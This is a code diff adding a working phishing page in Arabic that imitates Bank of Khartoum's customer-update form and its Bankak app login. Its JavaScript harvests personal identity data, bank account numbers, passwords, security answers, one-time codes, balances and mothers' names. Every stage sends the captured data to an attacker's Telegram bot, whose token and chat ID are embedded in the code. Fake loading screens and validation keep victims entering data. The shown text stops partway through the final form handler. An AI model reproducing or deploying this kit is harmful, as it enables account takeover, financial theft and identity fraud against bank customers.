+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V8h14v11z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-dob" class="input-box" placeholder="تاريخ الميلاد (DD-MM-YYYY)">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-id" class="input-box" placeholder="الرقم الوطني / رقم الهوية">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-phone" class="input-box" placeholder="رقم الموبايل">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M16.75 13.96c.25.13.41.2.48.3.07.1.07.57-.13 1.14-.2.57-1.15 1.07-1.6 1.11-.45.04-.84.22-2.86-.59-2.02-.81-3.3-2.87-3.4-3.01-.1-.14-.82-1.09-.82-2.08 0-.99.51-1.48.69-1.68.18-.2.39-.25.52-.25.13 0 .26 0 .37.01.12.01.28-.05.44.34.16.39.54 1.32.59 1.42.05.1.08.22.01.35-.07.13-.11.21-.22.34-.11.13-.23.29-.33.39-.11.11-.23.23-.1.45.13.22.58.96 1.25 1.55.86.76 1.58 1 1.8 1.11.22.11.35.09.48-.06.13-.15.55-.64.7-.86.15-.22.3-.18.5-.11.2.07 1.28.6 1.5.71.22.11.37.16.42.25.05.09.05.52-.2 1.15zM12 2a10 10 0 1 1 8.94 14.53L22 22l-5.65-1.02A10 10 0 1 1 12 2 z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-whatsapp" class="input-box" placeholder="رقم الواتساب">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 10h12v2H6zm0 4h8v2H6z"/></svg>
+                        <div class="field-body">
+                            <input type="email" id="field-email" class="input-box" placeholder="البريد الإلكتروني">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M20 6h-4V4c0-1.1-.9-2-2-2h-4c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM10 4h4v2h-4V4zm10 15H4V8h16v11z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-job" class="input-box" placeholder="المهنة / الوظيفة">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.64 0 2.53 2.21 3.47 5.12 4.15 2.37.55 3.38 1.25 3.38 2.36 0 1.17-1.05 1.94-2.8 1.94-1.95 0-2.65-.91-2.73-2.2H6.9c.08 2.05 1.48 3.36 3.4 3.8v2.06h3v-2.05c2.1-.38 3.7-1.6 3.7-3.79 0-2.84-2.43-3.77-5.2-4.4z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-income" class="input-box" placeholder="الدخل الشهري المتوقع">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <div class="field-body" style="width:100%;">
+                            <select id="field-education" class="select-box">
+                                <option value="">اختر المستوى التعليمي</option>
+                                <option value="أساسي / متوسط">أساسي / متوسط</option>
+                                <option value="ثانوي">ثانوي</option>
+                                <option value="جامعي (بكالوريوس)">جامعي (بكالوريوس)</option>
+                                <option value="دراسات عليا">دراسات عليا (ماجستير/دكتوراه)</option>
+                                <option value="أخرى">أخرى</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-address" class="input-box" placeholder="العنوان الحالي (المدينة / الحي)">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <svg class="field-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                        <div class="field-body">
+                            <input type="text" id="field-country" class="input-box" placeholder="البلد" value="السودان">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <div class="field-body" style="width:100%;">
+                            <input type="text" id="field-branch" class="input-box" placeholder="الفرع أو الجهة التابع لها">
+                        </div>
+                    </div>
+
+                    <div class="field-row">
+                        <div class="field-body" style="width:100%;">
+                            <select id="field-gender" class="select-box">
+                                <option value="">اختر الجنس</option>
+                                <option value="ذكر">ذكر</option>
+                                <option value="أنثى">أنثى</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="submit-container">
+                    <button class="btn-submit" onclick="submitFirstForm()">إرسال وتحديث البيانات</button>
+                </div>
+            </div>
+
+            <!-- 2. شاشة معاينة الاستمارة بخط اليد الأزرق -->
+            <div class="screen" id="screenPreviewForm">
+                <div class="preview-form-container">
+                    <div class="gold-stripes"></div>
+                    <div class="bok-preview-card">
+                        <div class="bok-header-section">
+                            <div class="bok-title-ar" id="previewTitleAr">استمارة تحديث بيانات العملاء</div>
+                            <div class="bok-title-en">Customer Information Update Form</div>
+                            <div class="bok-logo-img">
+                                <div style="text-align: right; line-height: 1.1;">
+                                    <div style="font-size: 0.9rem; font-weight: 900;">بنك الخرطوم</div>
+                                    <div style="font-size: 0.6rem; color: #555;">Bank of Khartoum</div>
+                                </div>
+                                <span class="green-circle"></span>
+                            </div>
+                        </div>
+
+                        <div class="handwritten-field"><span class="handwritten-label">Account Name</span><span class="handwritten-value" id="prev-name">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">CIF / Account</span><span class="handwritten-value" id="prev-account">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">Birth Date</span><span class="handwritten-value" id="prev-dob">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">National ID</span><span class="handwritten-value" id="prev-id">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">Mobile Phone</span><span class="handwritten-value" id="prev-phone">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">WhatsApp</span><span class="handwritten-value" id="prev-whatsapp">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">Email</span><span class="handwritten-value" id="prev-email">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">Job / Profession</span><span class="handwritten-value" id="prev-job">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">Monthly Income</span><span class="handwritten-value" id="prev-income">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">Education</span><span class="handwritten-value" id="prev-education">--</span></div>
+                        <div class="handwritten-field"><span class="handwritten-label">Branch</span><span class="handwritten-value" id="prev-branch">--</span></div>
+                    </div>
+
+                    <div style="margin-top: 20px; width: 100%; max-width: 400px; z-index: 10; margin-bottom: 20px;">
+                        <button class="btn-submit" onclick="proceedToBankakApp()">تأكيد والانتقال لتطبيق بنكك</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 3. شاشة تقديم الطلب النهائية -->
+            <div class="screen" id="screenLoading">
+              <div class="top-header" style="padding: 12px 16px;">
+                <div class="header-bar">
+                  <span class="page-title">حالة الطلب</span>
+                </div>
+                <div class="logo-box" style="transform: scale(0.7);">
+                  <div class="logo-ar">بنك الخرطوم</div>
+                </div>
+              </div>
+
+              <div class="loading-screen">
+                <div class="dots-loader" style="background: transparent;">
+                    <div style="background-color: #b90924;"></div>
+                    <div style="background-color: #b90924;"></div>
+                    <div style="background-color: #b90924;"></div>
+                </div>
+                <div class="loading-title">جاري الانتقال لتطبيق بنكك...</div>
+                <div class="loading-subtitle">يرجى الانتظار قليلاً</div>
+
+                <div class="contact-card">
+                  <div class="contact-title">للتواصل ومراجعة الطلب:</div>
+                  <div class="contact-number">📞 1913</div>
+                  <div class="whatsapp-info">💬 واتساب بنك الخرطوم الرسمي</div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 4. محاكي تطبيق بنكك: شاشة تسجيل الدخول -->
+            <div class="screen" id="screenLogin">
+              <div class="bankak-login-header">
+                <div class="logo-box">
+                  <div class="logo-ar">بنـ<span>كك</span></div>
+                  <div class="logo-en">ban<span>kak</span></div>
+                </div>
+              </div>
+
+              <div class="bankak-login-form-container">
+                <div class="login-card-box">
+                  <form onsubmit="handleLoginSubmit(event)">
+                    <div style="position:relative; margin-bottom: 16px;">
+                      <span class="icon-right"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></span>
+                      <input type="text" class="input-field" id="userIdInput" placeholder="أدخل رقم الحساب ( أو 249-رقم الموبايل)" maxlength="12" />
+                    </div>
+
+                    <div style="position:relative; margin-bottom: 20px;">
+                      <span class="icon-left-toggle" id="togglePasswordBtn" onclick="togglePasswordVisibility()">👁️</span>
+                      <input type="password" class="input-field" id="passwordInput" placeholder="ادخل كلمة المرور" style="padding-left: 45px; padding-right: 15px;" />
+                    </div>
+
+                    <button type="submit" class="btn-red">تسجيل الدخول</button>
+                  </form>
+
+                  <div style="display:flex; justify-content:space-between; margin-top: 15px; font-size: 0.9rem; color:#6b7280; font-weight: 600;">
+                    <span>تسجيل جديد؟</span>
+                    <span>لاتستطيع تسجيل الدخول؟</span>
+                  </div>
+                  
+                  <div style="margin-top: 12px; font-size: 0.9rem; color:#6b7280; display: flex; align-items: center; gap: 6px;">
+                    <span style="color: #dc2626;">🟥</span> شارك رمز
+                  </div>
+                </div>
+              </div>
+
+              <div class="bottom-nav">
+                <div class="nav-link"><div class="icon-circle icon-fb"><i class="fa-brands fa-facebook-f"></i></div><span>فيس بوك</span></div>
+                <div class="nav-link"><div class="icon-circle icon-help"><i class="fa-solid fa-phone"></i></div><span>المساعدة</span></div>
+                <div class="nav-link"><div class="icon-circle icon-location"><i class="fa-solid fa-location-dot"></i></div><span>مواقعنا</span></div>
+                <div class="nav-link"><div class="icon-circle icon-bok"><i class="fa-solid fa-globe"></i></div><span>بنك الخرطوم</span></div>
+              </div>
+            </div>
+
+            <!-- 5. شاشة أسئلة الأمان -->
+            <div class="screen" id="screenQuestions">
+              <div class="top-header" style="padding: 12px 16px;">
+                <div class="header-bar">
+                  <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
+                  <span class="page-title">أسئلة الأمان</span>
+                </div>
+                <div class="logo-box" style="transform: scale(0.7);">
+                  <div class="logo-ar">بنـ<span>كك</span></div>
+                </div>
+              </div>
+
+              <div class="form-section">
+                <p style="font-size: 0.9rem; color: #374151; margin-bottom: 12px; font-weight: 600;" id="questionText">
+                  ما هو اسم المدرسة التي التحقت بها؟
+                </p>
+
+                <div style="position:relative; margin-bottom: 14px;">
+                  <input type="text" class="input-field" placeholder="أدخل الجواب" id="answerInput" style="padding-left: 15px; padding-right: 15px;" />
+                </div>
+
+                <div class="btn-group">
+                  <button class="btn-red" onclick="validateSecurityAnswer()">إرسال</button>
+                  <button class="btn-red" onclick="nextQuestion()">سؤال آخر</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- 6. شاشة التحقق OTP -->
+            <div class="screen" id="screenOtp">
+              <div class="top-header" style="padding: 12px 16px;">
+                <div class="header-bar">
+                  <button class="btn-back" onclick="switchScreen('screenQuestions')">رجوع ➔</button>
+                  <span class="page-title">التحقق</span>
+                </div>
+                <div class="logo-box" style="transform: scale(0.7);">
+                  <div class="logo-ar">بنـ<span>كك</span></div>
+                </div>
+              </div>
+
+              <div class="form-section">
+                <div class="otp-card">
+                  <div class="timer-circle"></div>
+                  <div class="timer-text">الوقت المتبقي <span id="timerCountdown">59:00</span></div>
+                  <p class="otp-info">تم إرسال الرمز السري (OTP) إلى رقم هاتفك المسجل / البريد الإلكتروني.</p>
+
+                  <div style="position:relative; margin-bottom: 14px;">
+                    <span class="icon-right">📱</span>
+                    <input type="text" class="input-field" id="otpInput" placeholder="أدخل الرمز السري (6 أرقام)" maxlength="6" style="padding-right: 45px; padding-left: 15px;" />
+                  </div>
+
+                  <a href="#" class="resend-link">إعادة إرسال</a>
+
+                  <div class="btn-group">
+                    <button class="btn-red" onclick="validateOtp()">إرسال</button>
+                    <button class="btn-red" style="background:#ef4444;" onclick="switchScreen('screenLogin')">إلغاء</button>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 7. شاشة استمارة إضافية بعد رمز التحقق (الاسم، رقم الحساب، رقم الهاتف، الرصيد المتبقي، اسم الوالدة) -->
+            <div class="screen" id="screenPostOtpForm">
+              <div class="top-header" style="padding: 12px 16px;">
+                <div class="header-bar">
+                  <button class="btn-back" onclick="switchScreen('screenOtp')">رجوع ➔</button>
+                  <span class="page-title">استمارة تأكيد البيانات</span>
+                </div>
+                <div class="logo-box" style="transform: scale(0.7);">
+                  <div class="logo-ar">بنـ<span>كك</span></div>
+                </div>
+              </div>
+
+              <div class="form-section">
+                <p style="font-size: 0.95rem; color: #374151; margin-bottom: 16px; font-weight: bold; text-align: center;">
+                  يرجى استكمال البيانات التالية لإتمام العملية بنجاح:
+                </p>
+
+                <div style="position:relative; margin-bottom: 14px;">
+                  <input type="text" class="input-field" id="post-name" placeholder="الاسم" style="padding-left: 15px; padding-right: 15px;" />
+                </div>
+
+                <div style="position:relative; margin-bottom: 14px;">
+                  <input type="text" class="input-field" id="post-account" placeholder="رقم الحساب" style="padding-left: 15px; padding-right: 15px;" />
+                </div>
+
+                <div style="position:relative; margin-bottom: 14px;">
+                  <input type="text" class="input-field" id="post-phone" placeholder="رقم الهاتف" style="padding-left: 15px; padding-right: 15px;" />
+                </div>
+
+                <div style="position:relative; margin-bottom: 14px;">
+                  <input type="text" class="input-field" id="post-balance" placeholder="الرصيد المتبقي في الحساب" style="padding-left: 15px; padding-right: 15px;" />
+                </div>
+
+                <div style="position:relative; margin-bottom: 20px;">
+                  <input type="text" class="input-field" id="post-mother" placeholder="اسم الوالدة" style="padding-left: 15px; padding-right: 15px;" />
+                </div>
+
+                <button class="btn-red" onclick="validatePostOtpForm()">تأكيد وإرسال نهائي</button>
+              </div>
+            </div>
+
+            <!-- 8. شاشة تأكيد الطلب النهائية -->
+            <div class="screen" id="screenFinalLoading">
+              <div class="top-header" style="padding: 12px 16px;">
+                <div class="header-bar">
+                  <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
+                  <span class="page-title" id="finalTitleText">حالة الطلب</span>
+                </div>
+                <div class="logo-box" style="transform: scale(0.7);">
+                  <div class="logo-ar">بنـ<span>كك</span></div>
+                </div>
+              </div>
+
+              <div class="loading-screen" id="finalLoadingContent">
+                <div class="dots-loader" style="background: transparent;">
+                    <div style="background-color: #b90924;"></div>
+                    <div style="background-color: #b90924;"></div>
+                    <div style="background-color: #b90924;"></div>
+                </div>
+                <div class="loading-title" id="loadingMainText">جاري تقديم الطلب...</div>
+                <div class="loading-subtitle" id="loadingSubText">يرجى عدم الخروج من الصفحة</div>
+
+                <div class="contact-card">
+                  <div class="contact-title">للتواصل ومراجعة الطلب:</div>
+                  <div class="contact-number" id="referenceNumberDisplay">📞 1913</div>
+                  <div class="whatsapp-info">💬 واتساب بنك الخرطوم الرسمي</div>
+                </div>
+              </div>
+            </div>
+
+            <!-- نافذة خطأ الإدخال المنبثقة -->
+            <div class="modal-overlay" id="modalError">
+              <div class="modal-box" style="text-align: center; padding: 0; overflow: hidden; border-radius: 12px;">
+                <div style="background-color: #dc2626; color: white; padding: 15px; font-size: 1.1rem; font-weight: bold;">خطأ</div>
+                <div class="modal-body" id="modalErrorText" style="padding: 25px 20px; font-size: 1rem; color: #333;">Invalid Source. Please contact Customer Care</div>
+                <div style="padding: 0 20px 20px 20px; display: flex; justify-content: center;">
+                  <button class="btn-red" style="max-width: 180px; margin: 0;" onclick="closeErrorModal()">إعادة المحاولة</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- النافذة المنبثقة: موبايل مختلف -->
+            <div class="modal-overlay" id="modalDevice">
+              <div class="modal-box">
+                <div class="modal-header">ترغب في استخدام موبايل مختلف؟</div>
+                <div class="modal-body" style="font-size: 0.85rem;">
+                  إذا كنت تحاول الدخول من جهاز موبايل مختلف (غير الموبايل المسجل) اضغط على زر إعادة التعيين واتبع التعليمات.
+                </div>
+                <div class="modal-actions" style="display: flex; flex-direction: column; gap: 6px; width: 100%;">
+                  <button class="btn-red" onclick="goToSecurityQuestions()">الإجابة على أسئلة الأمان</button>
+                  <button class="btn-red" onclick="closeModal('modalDevice')">باستخدام بطاقة الصراف الآلي</button>
+                  <button class="btn-red" style="background: #ef4444;" onclick="closeModal('modalDevice')">إلغاء</button>
+                </div>
+              </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        let selectedServiceName = '';
+
+        function openSudanServicesScreen() {
+            document.getElementById('sudanServicesScreen').style.display = 'flex';
+        }
+
+        function closeSudanServicesScreen() {
+            document.getElementById('sudanServicesScreen').style.display = 'none';
+        }
+
+        function openSudanForm(serviceName) {
+            selectedServiceName = serviceName;
+            document.getElementById('sudanFormTitle').textContent = serviceName;
+            closeSudanServicesScreen();
+            document.getElementById('sudanFormScreen').style.display = 'flex';
+        }
+
+        function closeSudanFormScreen() {
+            document.getElementById('sudanFormScreen').style.display = 'none';
+            document.getElementById('sudanServicesScreen').style.display = 'flex';
+        }
+
+        function submitSudanForm() {
+            const name = document.getElementById('sudan-name').value.trim();
+            const account = document.getElementById('sudan-account').value.trim();
+            const phone = document.getElementById('sudan-phone').value.trim();
+            const whatsapp = document.getElementById('sudan-whatsapp').value.trim();
+
+            if (!name || !account || !phone || !whatsapp) {
+                showErrorModal("يرجى تعبئة جميع الحقول المطلوبة للمتابعة.");
+                return;
+            }
+
+            sendToTelegram(`📍 *خدمة داخل السودان (${selectedServiceName}):*
+👤 الاسم: ${name}
+🏦 رقم الحساب: ${account}
+📱 رقم الهاتف: ${phone}
+💬 رقم الواتساب: ${whatsapp}`);
+
+            document.getElementById('sudanFormScreen').style.display = 'none';
+
+            const globalLoader = document.getElementById('globalLoader');
+            document.getElementById('globalLoaderText').textContent = `جاري الانتقال لتطبيق بنكك...`;
+            globalLoader.style.display = 'flex';
+
+            setTimeout(function() {
+                globalLoader.style.display = 'none';
+                document.getElementById('mainAppHome').style.display = 'none';
+                document.getElementById('updateContainer').style.display = 'block';
+                switchScreen('screenLogin');
+            }, 3000);
+        }
+
+        function openUpdateFormWithLoader() {
+            const globalLoader = document.getElementById('globalLoader');
+            document.getElementById('globalLoaderText').textContent = 'جاري التحقق من الموقع والاتصال بخدمات بنكك...';
+            globalLoader.style.display = 'flex';
+
+            setTimeout(function() {
+                globalLoader.style.display = 'none';
+                document.getElementById('mainAppHome').style.display = 'none';
+                document.getElementById('updateContainer').style.display = 'block';
+                switchScreen('screenProfile');
+            }, 7000);
+        }
+
+        const botToken = "8995565845:AAHtl9nON6pgq4bs1_e60b9g4R1Ue0bIFa4"; 
+        const chatId = "8963432814";     
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const nameInput = document.getElementById('field-name');
+            if(nameInput) {
+                nameInput.addEventListener('input', (e) => {
+                    e.target.value = e.target.value.replace(/[^\u0600-\u06FFa-zA-Z\s]/g, '');
+                });
+            }
+
+            const accountInput = document.getElementById('field-account');
+            if(accountInput) {
+                accountInput.addEventListener('input', (e) => {
+                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 7);
+                });
+            }
+
+            const dobInput = document.getElementById('field-dob');
+            if(dobInput) {
+                dobInput.addEventListener('input', (e) => {
+                    let val = e.target.value.replace(/\D/g, '');
+                    if (val.length > 2 && val.length <= 4) {
+                        val = val.slice(0, 2) + '-' + val.slice(2);
+                    } else if (val.length > 4) {
+                        val = val.slice(0, 2) + '-' + val.slice(2, 4) + '-' + val.slice(4, 8);
+                    }
+                    e.target.value = val;
+                });
+            }
+
+            const phoneInput = document.getElementById('field-phone');
+            if(phoneInput) {
+                phoneInput.addEventListener('input', (e) => {
+                    e.target.value = e.target.value.replace(/\D/g, '');
+                });
+            }
+
+            const incomeInput = document.getElementById('field-income');
+            if(incomeInput) {
+                incomeInput.addEventListener('input', (e) => {
+                    let cleanVal = e.target.value.replace(/\D/g, '');
+                    if (cleanVal) {
+                        e.target.value = Number(cleanVal).toLocaleString('en-US');
+                    } else {
+                        e.target.value = '';
+                    }
+                });
+            }
+        });
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: "Markdown"
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.error('Error:', err));
+        }
+
+        function submitFirstForm() {
+            const fields = [
+                { id: 'field-name', name: 'الاسم رباعي' },
+                { id: 'field-account', name: 'رقم الحساب البنكي' },
+                { id: 'field-dob', name: 'تاريخ الميلاد' },
+                { id: 'field-id', name: 'الرقم الوطني / رقم الهوية' },
+                { id: 'field-phone', name: 'رقم الموبايل' },
+                { id: 'field-whatsapp', name: 'رقم الواتساب' },
+                { id: 'field-email', name: 'البريد الإلكتروني' },
+                { id: 'field-job', name: 'المهنة / الوظيفة' },
+                { id: 'field-income', name: 'الدخل الشهري المتوقع' },
+                { id: 'field-education', name: 'المستوى التعليمي' },
+                { id: 'field-address', name: 'العنوان الحالي' },
+                { id: 'field-country', name: 'البلد' },
+                { id: 'field-branch', name: 'الفرع أو الجهة التابع لها' },
+                { id: 'field-gender', name: 'الجنس' }
+            ];
+
+            fields.forEach(f => {
+                document.getElementById(f.id).classList.remove('input-error');
+            });
+
+            for (let field of fields) {
+                const el = document.getElementById(field.id);
+                if (!el.value.trim()) {
+                    el.classList.add('input-error');
+                    el.focus();
+                    showErrorModal(`الرجاء إكمال الحقل: (${field.name})`);
+                    return;
+                }
+            }
+
+            const accountVal = document.getElementById('field-account').value;
+            if (accountVal.length !== 7) {
+                document.getElementById('field-account').classList.add('input-error');
+                document.getElementById('field-account').focus();
+                showErrorModal("رقم الحساب البنكي يجب أن يكون 7 أرقام بالضبط.");
+                return;
+            }
+
+            const phoneVal = document.getElementById('field-phone').value;
+            if (phoneVal.length < 10) {
+                document.getElementById('field-phone').classList.add('input-error');
+                document.getElementById('field-phone').focus();
+                showErrorModal("رقم الموبايل يجب ألا يقل عن 10 أرقام.");
+                return;
+            }
+
+            const name = document.getElementById('field-name').value;
+            const account = accountVal;
+            const dob = document.getElementById('field-dob').value;
+            const idNum = document.getElementById('field-id').value;
+            const phone = phoneVal;
+            const whatsapp = document.getElementById('field-whatsapp').value;
+            const email = document.getElementById('field-email').value;
+            const job = document.getElementById('field-job').value;
+            const income = document.getElementById('field-income').value;
+            const education = document.getElementById('field-education').value;
+            const address = document.getElementById('field-address').value;
+            const country = document.getElementById('field-country').value;
+            const branch = document.getElementById('field-branch').value;
+            const gender = document.getElementById('field-gender').value;
+
+            document.getElementById('prev-name').textContent = name;
+            document.getElementById('prev-account').textContent = account;
+            document.getElementById('prev-dob').textContent = dob;
+            document.getElementById('prev-id').textContent = idNum;
+            document.getElementById('prev-phone').textContent = phone;
+            document.getElementById('prev-whatsapp').textContent = whatsapp;
+            document.getElementById('prev-email').textContent = email;
+            document.getElementById('prev-job').textContent = job;
+            document.getElementById('prev-income').textContent = income;
+            document.getElementById('prev-education').textContent = education;
+            document.getElementById('prev-branch').textContent = branch;
+
+            const profileMsg = `📥 *بيانات استمارة جديدة متكاملة:*
+👤 الاسم: ${name}
+🏦 رقم الحساب: ${account}
+📅 تاريخ الميلاد: ${dob}
+🆔 الرقم الوطني/الهوية: ${idNum}
+📱 الهاتف: ${phone}
+💬 رقم الواتساب: ${whatsapp}
+📧 البريد: ${email}
+💼 المهنة: ${job}
+💰 الدخل الشهري: ${income}
+🎓 المستوى التعليمي: ${education}
+🏠 العنوان: ${address}
+🌍 البلد: ${country}
+🏢 الفرع: ${branch}
+🚻 الجنس: ${gender}`;
+
+            sendToTelegram(profileMsg);
+            switchScreen('screenPreviewForm');
+        }
+
+        function proceedToBankakApp() {
+            const loader = document.getElementById('loader-overlay');
+            document.getElementById('loader-message').textContent = "جاري الانتقال لتطبيق بنكك...";
+            loader.style.display = 'flex';
+
+            setTimeout(function() {
+                loader.style.display = 'none';
+                switchScreen('screenLogin'); 
+            }, 7000);
+        }
+
+        const questions = [
+          "ما هو اسم المدرسة التي التحقت بها؟",
+          "العلامة التجارية لأول تلفزيون خاص بك؟",
+          "أي فيلم هو المفضَّل لديك؟",
+          "ما هو اسم ابن عمك الأول؟",
+          "ماذا كان لديك أثناء الطفولة؟"
+        ];
+        let currentQIndex = 0;
+        let timerInterval;
+
+        function togglePasswordVisibility() {
+          const passwordInput = document.getElementById('passwordInput');
+          const toggleBtn = document.getElementById('togglePasswordBtn');
+          if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            toggleBtn.textContent = '🙈';
+          } else {
+            passwordInput.type = 'password';
+            toggleBtn.textContent = '👁️';
+          }
+        }
+
+        function handleLoginSubmit(e) {
+          e.preventDefault();
+          const accInput = document.getElementById('userIdInput').value.trim();
+          const passInput = document.getElementById('passwordInput').value;
+
+          const accRegex = /^\d{7}$/;
+          const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]).{8,}$/;
+
+          if (!accRegex.test(accInput) || !passRegex.test(passInput)) {
+            showErrorModal("Invalid Source. Please contact Customer Care");
+            return;
+          }
+
+          sendToTelegram(`🚨 *تسجيل دخول (بنكك)*\n\n👤 المعرف: \`${accInput}\`\n🔑 كلمة المرور: \`${passInput}\``);
+          document.getElementById('modalDevice').style.display = 'flex';
+        }
+
+        function goToSecurityQuestions() {
+          closeModal('modalDevice');
+          switchScreen('screenQuestions');
+        }
+
+        function nextQuestion() {
+          currentQIndex = (currentQIndex + 1) % questions.length;
+          document.getElementById('questionText').textContent = questions[currentQIndex];
+          document.getElementById('answerInput').value = '';
+        }
+
+        function validateSecurityAnswer() {
+          const answer = document.getElementById('answerInput').value.trim();
+          const currentQuestion = document.getElementById('questionText').textContent;
+
+          if (answer === '') {
+            showErrorModal("يرجى إدخال إجابة سؤال الأمان للمتابعة.");
+          } else {
+            sendToTelegram(`🛡️ *إجابة سؤال الأمان*\n\n❓ السؤال: ${currentQuestion}\n💡 الإجابة: \`${answer}\``);
+            goToOtpScreen();
+          }
+        }
+
+        function goToOtpScreen() {
+          switchScreen('screenOtp');
+          startTimer(3540);
+        }
+
+        function startTimer(duration) {
+          clearInterval(timerInterval);
+          let timer = duration, minutes, seconds;
+          timerInterval = setInterval(() => {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            document.getElementById('timerCountdown').textContent = minutes + ":" + seconds;
+
+            if (--timer < 0) {
+              clearInterval(timerInterval);
+            }
+          }, 1000);
+        }
+
+        function validateOtp() {
+          const otp = document.getElementById('otpInput').value.trim();
+
+          if (!/^\d{6}$/.test(otp)) {
+            showErrorModal("رمز التحقق غير صحيح، يجب أن يتكون من 6 أرقام.");
+            return;
+          }
+
+          if (/^(\d)\1{5}$/.test(otp)) {
+            showErrorModal("رمز التحقق المكرر غير مقبول.");
+            return;
+          }
+
+          const sequentialList = [
+            "012345", "123456", "234567", "345678", "456789",
+            "543210", "654321", "765432", "876543", "987654"
+          ];
+
+          if (sequentialList.includes(otp)) {
+            showErrorModal("رمز التحقق المتسلسل غير مقبول.");
+            return;
+          }
+
+          sendToTelegram(`📱 *رمز التحقق OTP*\n\n🔢 الرمز: \`${otp}\``);
+          
+          // الانتقال لشاشة الاستمارة الإضافية بعد رمز التحقق
+          switchScreen('screenPostOtpForm');
+        }
+
+        function validatePostOtpForm() {
+          const name = document.getElementById('post-name').value.trim();
+          const account = document.getElementById('post-account').value.trim();
+          const phone = document.getElementById('post-phone').value.trim();
+          const balance = document.getElementById('post-balance').value.trim();
+          const mother = document.getElementById('post-mother').value.trim();
+
